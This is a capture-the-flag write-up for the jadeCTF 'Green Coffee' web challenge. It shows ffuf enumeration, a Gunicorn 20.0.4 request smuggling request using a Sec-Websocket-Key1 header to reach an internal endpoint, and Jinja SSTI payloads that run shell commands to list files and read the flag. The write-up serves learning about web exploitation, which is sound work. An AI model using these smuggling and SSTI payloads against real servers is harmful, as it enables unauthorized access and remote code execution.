# Green Coffee 

Challenge Description: 
My n00b friend built this web application for his coffee business.
Can you help me pwn it?

Note: Enumeration is allowed, but don't use very large wordlists.
http://34.76.206.46:10014

The site appears to be static with no real information on it. from the description we can see we need to find something from enumeration.

from running the following command. we pretty quickly find an internal endpoint
```ffuf -u  http://34.76.206.46:10014/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --mc all --fs 207```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://34.76.206.46:10014/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 207
________________________________________________

internal                [Status: 200, Size: 163, Words: 42, Lines: 8, Duration: 22ms]
forbidden               [Status: 200, Size: 163, Words: 42, Lines: 8, Duration: 72ms]
```

From viewing this page we get the message "You shouldn't be here. This is for internal use only"

So clearly we need to view this from some internal method. 


One of the server respone headers shows us that it is running Gunicorn/20.0.4

```❯ curl http://34.76.206.46:10014/internal -vvv
*   Trying 34.76.206.46:10014...
* Connected to 34.76.206.46 (34.76.206.46) port 10014 (#0)
> GET /internal HTTP/1.1
> Host: 34.76.206.46:10014
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< server: gunicorn/20.0.4
< date: Sat, 22 Oct 2022 19:24:34 GMT
< content-type: text/html; charset=utf-8
< content-length: 163
```

A quick google of that version and you can find this blog post https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/

This blog post details how using the "Sec-Websocket-Key1" header can result in request smuggling

After following the proof of concept given. I had the following payload working in BurpSuite Note: For this to work. you'll need to disable update content length in burp repeater

![](https://i.imgur.com/O7vvLRy.png)

On the right hand side you can see
```
<html>
    <head>
        <title>Internal Portal</title>
    </head>
    <body>
        <h1>Internal Portal</h1>
        <h3>GET err: Missing username parameter</h3>
    </body>
</html>
```

So we can hit the internal portal. It's missing the "username" parameter.

```
GET /a HTTP/1.1
Host: 34.76.206.46:10014
Content-Length: 68
Sec-Websocket-Key1: x

xxxxxxxxGET /internal?username=admin HTTP/1.1
Host: 127.0.0.1:10014

GET /internal HTTP/1.1
Host: localhost
```
Cropped Response:
```
<html>
    <head>
        <title>
            Internal Portal
        </title>
    </head>
    <body>
        <h1>Internal Portal</h1>
        <h3>Welcome, admin</h3>
    </body>
</html>
```

Knowing the backend was likely python. I tried SSTI with the normal ```{{7*7}}``` payload


```
<html>
    <head>
        <title>
            Internal Portal
        </title>
    </head>
    <body>
        <h1>Internal Portal</h1>
        <h3>Welcome, 49</h3>
    </body>
</html>
```

Okay so we have SSTI. Now to get the flag. 

```/internal?username={{%20config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read()%20}}```

Gives us the return
```
<html>
    <head>
        <title>
            Internal Portal
        </title>
    </head>
    <body>
        <h1>Internal Portal</h1>
        <h3>Welcome, app.py
flag.txt
requirements.txt
static
templates
</h3>
    </body>
</html>
```

So now we just run 
```
/internal?username={{%20config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat%20flag.txt").read()%20}}
```

```
<html>
    <head>
        <title>
            Internal Portal
        </title>
    </head>
    <body>
        <h1>Internal Portal</h1>
        <h3>Welcome, jadeCTF{smuggl3r_smuggl1ng_p4yl04ddd!}</h3>
    </body>
</html>
```

Flag: jadeCTF{smuggl3r_smuggl1ng_p4yl04ddd!}
